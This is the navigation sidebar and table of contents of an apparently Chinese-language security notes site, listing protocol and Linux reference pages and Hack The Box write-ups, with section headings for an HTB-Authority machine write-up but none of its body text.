          <label class="md-nav__link" for="__nav_8_4" id="__nav_8_4_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Network
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_8_4_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_8_4">
            <span class="md-nav__icon md-icon"></span>
            Network
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Resources/Network/Email/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Email
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
          
        
        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_8_4_2" >
        
          
          <label class="md-nav__link" for="__nav_8_4_2" id="__nav_8_4_2_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Protocol
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_8_4_2_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_8_4_2">
            <span class="md-nav__icon md-icon"></span>
            Protocol
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Resources/Network/Protocol/DNS/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    DNS
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Resources/Network/Protocol/Whois/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Whois
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Resources/Network/Protocol/ICMP/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    ICMP
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Resources/Network/Protocol/SSH/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    SSH
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Resources/Network/Protocol/LDAP/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    LDAP
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Resources/Network/Protocol/NetBIOS/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    NetBIOS
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Resources/Network/Protocol/SMB/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    SMB
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Resources/Network/Protocol/RPC/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    RPC
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Resources/Network/Protocol/WinRM/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    WinRM
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Resources/Network/Protocol/SNMP/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    SNMP
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Resources/Network/Protocol/SMTP/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    SMTP
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Resources/Network/Protocol/NFS/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    NFS
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Resources/Network/Protocol/Gopher/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Gopher
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
          
        
        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_8_5" >
        
          
          <label class="md-nav__link" for="__nav_8_5" id="__nav_8_5_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    General
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_8_5_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_8_5">
            <span class="md-nav__icon md-icon"></span>
            General
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Resources/General/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    正则表达式
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
          
        
        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_8_6" >
        
          
          <label class="md-nav__link" for="__nav_8_6" id="__nav_8_6_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    API
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_8_6_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_8_6">
            <span class="md-nav__icon md-icon"></span>
            API
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Resources/API/SASL/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    SASL
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
          
        
        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_8_7" >
        
          
          <label class="md-nav__link" for="__nav_8_7" id="__nav_8_7_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    PKI
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_8_7_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_8_7">
            <span class="md-nav__icon md-icon"></span>
            PKI
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Resources/PKI/%E5%85%AC%E9%92%A5%E8%AF%81%E4%B9%A6/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    公钥证书
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
          
        
        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_8_8" >
        
          
          <label class="md-nav__link" for="__nav_8_8" id="__nav_8_8_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Linux
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_8_8_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_8_8">
            <span class="md-nav__icon md-icon"></span>
            Linux
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Resources/Linux/Linux%E5%8F%91%E8%A1%8C%E7%89%88/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Linux发行版
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Resources/Linux/Linux%E5%91%BD%E4%BB%A4/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Linux命令
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Resources/Linux/Linux%E5%90%84%E7%A7%8D%E6%8B%AC%E5%8F%B7/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Linux各种括号
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Resources/Linux/Linux%E6%96%87%E4%BB%B6%E6%9D%83%E9%99%90/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Linux文件权限
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Resources/Linux/%E5%88%86%E5%8C%BA/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    分区
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Resources/Linux/%E5%91%BD%E4%BB%A4%E9%A3%8E%E6%A0%BC/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    命令风格
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Resources/Linux/%E6%8D%A2%E8%A1%8C%E7%AC%A6/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    换行符
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Resources/Linux/%E9%85%8D%E7%BD%AELinux%E5%9B%BE%E5%BD%A2%E6%A1%8C%E9%9D%A2%E8%BF%9E%E6%8E%A5/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    配置Linux图形桌面连接
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Resources/Linux/iptables/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    iptables
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Resources/Linux/%E5%91%BD%E5%90%8D%E7%AE%A1%E9%81%93/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    命名管道
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Resources/Linux/%E4%BF%AE%E6%94%B9IP/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    修改IP
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Resources/Linux/%E7%BB%88%E7%AB%AF/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    终端
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
          
        
        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_9" >
        
          
          <label class="md-nav__link" for="__nav_9" id="__nav_9_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    BlueTeam
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_9_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_9">
            <span class="md-nav__icon md-icon"></span>
            BlueTeam
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
          
        
        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_9_1" >
        
          
          <label class="md-nav__link" for="__nav_9_1" id="__nav_9_1_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Splunk
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_9_1_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_9_1">
            <span class="md-nav__icon md-icon"></span>
            Splunk
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../BlueTeam/Splunk/SPL%20memo/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    SPL memo
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../BlueTeam/Splunk/Splunk%E7%9F%A5%E8%AF%86%E7%82%B9/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Splunk知识点
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../BlueTeam/Splunk/Knowledge%20Object/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Knowledge Object
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../BlueTeam/Email%E5%AE%89%E5%85%A8/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Email安全
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
    
  
  
  
    
    
    
      
        
        
      
      
    
    
    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_10" checked>
        
          
          <label class="md-nav__link" for="__nav_10" id="__nav_10_label" tabindex="">
            
  
  <span class="md-ellipsis">
    靶机WriteUp
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_10_label" aria-expanded="true">
          <label class="md-nav__title" for="__nav_10">
            <span class="md-nav__icon md-icon"></span>
            靶机WriteUp
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../active/writeup-template/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    WP模板
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../HTB-Precious/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    HTB-Precious
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../HTB-Shoppy/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    HTB-Shoppy
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../HTB-Soccer/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    HTB-Soccer
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../HTB-MetaTwo/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    HTB-MetaTwo
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../HTB-Ambassador/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    HTB-Ambassador
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../HTB-APT/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    HTB-APT
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../HTB-MonitorsTwo/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    HTB-MonitorsTwo
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../HTB-Busqueda/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    HTB-Busqueda
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../HTB-PC/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    HTB-PC
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../HTB-Inject/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    HTB-Inject
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../HTB-Stocker/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    HTB-Stocker
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../HTB-OnlyForYou/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    HTB-OnlyForYou
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../HTB-Escape/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    HTB-Escape
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../HTB-Topology/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    HTB-Topology
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../HTB-Pilgrimage/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    HTB-Pilgrimage
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../HTB-Sau/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    HTB-Sau
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
    
  
  
  
    <li class="md-nav__item md-nav__item--active">
      
      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
      
      
      
        <label class="md-nav__link md-nav__link--active" for="__toc">
          
  
  <span class="md-ellipsis">
    HTB-Authority
  </span>
  

          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <a href="./" class="md-nav__link md-nav__link--active">
        
  
  <span class="md-ellipsis">
    HTB-Authority
  </span>
  

      </a>
      
        

<nav class="md-nav md-nav--secondary" aria-label="目录">
  
  
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      目录
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#summary" class="md-nav__link">
    <span class="md-ellipsis">
      Summary
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Summary">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#attack-path-overview" class="md-nav__link">
    <span class="md-ellipsis">
      Attack Path Overview
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_1" class="md-nav__link">
    <span class="md-ellipsis">
      扫描
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_2" class="md-nav__link">
    <span class="md-ellipsis">
      攻击路径规划·漏洞分析
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#smb" class="md-nav__link">
    <span class="md-ellipsis">
      SMB探索
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#development" class="md-nav__link">
    <span class="md-ellipsis">
      Development共享的文件分析
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Development共享的文件分析">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#share" class="md-nav__link">
    <span class="md-ellipsis">
      SHARE
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#pwm" class="md-nav__link">
    <span class="md-ellipsis">
      PWM
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#ldap" class="md-nav__link">
    <span class="md-ellipsis">
      LDAP
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#adcs" class="md-nav__link">
    <span class="md-ellipsis">
      ADCS
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#ansible" class="md-nav__link">
    <span class="md-ellipsis">
      Ansible
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Ansible">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#ansible_1" class="md-nav__link">
    <span class="md-ellipsis">
      尝试搭建ansible控制端发放命令执行
    </span>
  </a>
  
    <nav class="md-nav" aria-label="尝试搭建ansible控制端发放命令执行">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#pythonansible" class="md-nav__link">
    <span class="md-ellipsis">
      踩坑：Python高版本安装的ansible导致的报错
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#python39" class="md-nav__link">
    <span class="md-ellipsis">
      降版本安装python3.9
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#ansible_2" class="md-nav__link">
    <span class="md-ellipsis">
      安装ansible
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#python39ansible" class="md-nav__link">
    <span class="md-ellipsis">
      python3.9的ansible运行结果
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#vault" class="md-nav__link">
    <span class="md-ellipsis">
      破解vault
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#80" class="md-nav__link">
    <span class="md-ellipsis">
      80端口
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#8443" class="md-nav__link">
    <span class="md-ellipsis">
      8443端口
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#initial-access" class="md-nav__link">
    <span class="md-ellipsis">
      Initial Access
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#flag-user" class="md-nav__link">
    <span class="md-ellipsis">
      flag: user
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#privilege-escalation" class="md-nav__link">
    <span class="md-ellipsis">
      Privilege Escalation
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Privilege Escalation">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_3" class="md-nav__link">
    <span class="md-ellipsis">
      探索
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#ca" class="md-nav__link">
    <span class="md-ellipsis">
      CA模板漏洞
    </span>
  </a>
  
    <nav class="md-nav" aria-label="CA模板漏洞">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#certify" class="md-nav__link">
    <span class="md-ellipsis">
      Certify搜索漏洞模板
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#impacket-addcomputer" class="md-nav__link">
    <span class="md-ellipsis">
      impacket-addcomputer添加机器账户
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#abuse-by-certipy" class="md-nav__link">
    <span class="md-ellipsis">
      Abuse by Certipy
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Abuse by Certipy">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_4" class="md-nav__link">
    <span class="md-ellipsis">
      小插曲：迷之报错
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#certipy" class="md-nav__link">
    <span class="md-ellipsis">
      certipy请求证书
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#kdc_err_padata_type_nosupp" class="md-nav__link">
    <span class="md-ellipsis">
      KDC_ERR_PADATA_TYPE_NOSUPP
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#passthecert" class="md-nav__link">
    <span class="md-ellipsis">
      PassTheCert
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#flag-root" class="md-nav__link">
    <span class="md-ellipsis">
      flag: root
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_5" class="md-nav__link">
    <span class="md-ellipsis">
      总结·后记
    </span>
  </a>
  
</li>
      
    </ul>
  
</nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../HTB-Codify/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    HTB-Codify
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../HTB-Hospital/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    HTB-Hospital
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../HTB-Devvortex/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    HTB-Devvortex
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../HTB-Surveillance/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    HTB-Surveillance
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../HTB-Jab/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    HTB-Jab
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../HTB-Headless/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    HTB-Headless
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
  </ul>
</nav>
                  </div>
                </div>
              </div>
            
            
              
              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    

<nav class="md-nav md-nav--secondary" aria-label="目录">
  
  
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      目录
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#summary" class="md-nav__link">
    <span class="md-ellipsis">
      Summary
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Summary">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#attack-path-overview" class="md-nav__link">
    <span class="md-ellipsis">
      Attack Path Overview
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_1" class="md-nav__link">
    <span class="md-ellipsis">
      扫描
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_2" class="md-nav__link">
    <span class="md-ellipsis">
      攻击路径规划·漏洞分析
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#smb" class="md-nav__link">
    <span class="md-ellipsis">
      SMB探索
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#development" class="md-nav__link">
    <span class="md-ellipsis">
      Development共享的文件分析
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Development共享的文件分析">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#share" class="md-nav__link">
    <span class="md-ellipsis">
      SHARE
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#pwm" class="md-nav__link">
    <span class="md-ellipsis">
      PWM
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#ldap" class="md-nav__link">
    <span class="md-ellipsis">
      LDAP
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#adcs" class="md-nav__link">
    <span class="md-ellipsis">
      ADCS
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#ansible" class="md-nav__link">
    <span class="md-ellipsis">
      Ansible
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Ansible">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#ansible_1" class="md-nav__link">
    <span class="md-ellipsis">
      尝试搭建ansible控制端发放命令执行
    </span>
  </a>
  
    <nav class="md-nav" aria-label="尝试搭建ansible控制端发放命令执行">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#pythonansible" class="md-nav__link">
    <span class="md-ellipsis">
      踩坑：Python高版本安装的ansible导致的报错
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#python39" class="md-nav__link">
    <span class="md-ellipsis">
      降版本安装python3.9
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#ansible_2" class="md-nav__link">
    <span class="md-ellipsis">
      安装ansible
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#python39ansible" class="md-nav__link">
    <span class="md-ellipsis">
      python3.9的ansible运行结果
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#vault" class="md-nav__link">
    <span class="md-ellipsis">
      破解vault
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#80" class="md-nav__link">
    <span class="md-ellipsis">
      80端口
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#8443" class="md-nav__link">
    <span class="md-ellipsis">
      8443端口
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#initial-access" class="md-nav__link">
    <span class="md-ellipsis">
      Initial Access
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#flag-user" class="md-nav__link">
    <span class="md-ellipsis">
      flag: user
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#privilege-escalation" class="md-nav__link">
    <span class="md-ellipsis">
      Privilege Escalation
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Privilege Escalation">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_3" class="md-nav__link">
    <span class="md-ellipsis">
      探索
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#ca" class="md-nav__link">
    <span class="md-ellipsis">
      CA模板漏洞
    </span>
  </a>
  
